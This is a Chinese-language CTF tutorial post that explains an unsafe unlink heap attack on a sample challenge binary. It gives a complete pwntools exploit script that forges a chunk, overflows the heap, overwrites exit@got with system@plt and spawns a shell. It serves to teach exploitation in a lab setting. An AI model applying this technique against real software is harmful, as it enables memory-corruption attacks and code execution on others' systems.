---
title: unsafe unlink攻击技术示例
tags: [CTF, pwn, heap, unlink]
layout: post
categories: tutorials
---

在掌握了unsafe unlink的大致知识后, 这里以一个pwn题针对unsafe unlink进行一个简单的攻击示例

本节示例的漏洞程序可以从此处下载: [unsafe_unlink_example](http://od7mpc53s.bkt.clouddn.com/unsafe_unlink_example)

# 程序流程图

![unsafe_unlink_example](http://od7mpc53s.bkt.clouddn.com/unsafe_unlink_example.png)

# 攻击思路

首先程序是64位文件, 因此指针长度`size_p=8`. 我们整个的攻击思路就是, 自己先构造一个`fake_chunk`. 随后运行程序, 创建两个`chunk`, 然后向第一个chunk写入我们构造的`fake_chunk`, 这个`fake_chunk`不仅包含伪造的堆块, 还包括了堆溢出所覆盖第二个堆块的信息. 这样一来. 我们再释放掉第二个堆块, 这样自然就会使得我们的`fake_chunk`触发`unlink`操作.

接下来我们通过指针, 覆盖`exit@got`为`system@plt`, 再在菜单中选择`5`出发`exit()`就能正确执行`system`获得一个shell

# 利用代码

``` python
from pwn import *

#elf = ELF('./unsafe_unlink_example')
io = process('./unsafe_unlink_example')

size_p = 8
plt_system = 0x4009b6#elf.symbols['system']
got_exit = 0x601250#elf.got['exit']
pointer = 0x6012a0

fake_chunk = '\x00'*2*size_p + p64(pointer - 3*size_p) + p64(pointer - 2*size_p) + 'A'*(0x80-4*size_p) + p64(0x80) + p64(0x90)
overwrite = '\x00'*3*size_p + p64(got_exit)


# create node
io.recvuntil('------------------------\n')
io.sendline('1')
#io.recvuntil('create:')
io.sendline('0')

# create node
io.recvuntil('------------------------\n')
io.sendline('1')
#io.recvuntil('create:')
io.sendline('1')

# edit node
io.recvuntil('------------------------\n')
io.sendline('2')
#io.recvuntil('edit:')
io.sendline('0')
#io.recvuntil('input:')
io.sendline(str(len(fake_chunk)))
#io.recvuntil('node:')
io.sendline(fake_chunk)

# delete node
io.recvuntil('------------------------\n')
io.sendline('3')
#io.recvuntil('create:')
io.sendline('1')

# edit node
io.recvuntil('------------------------\n')
io.sendline('2')
#io.recvuntil('edit:')
io.sendline('0')
#io.recvuntil('input:')
io.sendline(str(len(overwrite)))
#io.recvuntil('node:')
io.sendline(overwrite)

# edit node
io.recvuntil('------------------------\n')
io.sendline('2')
#io.recvuntil('edit:')
io.sendline('0')
#io.recvuntil('input:')
io.sendline(str(size_p))
#io.recvuntil('node:')
io.sendline(p64(plt_system))

# exit
io.recvuntil('------------------------\n')
io.sendline('5')
io.interactive()
```
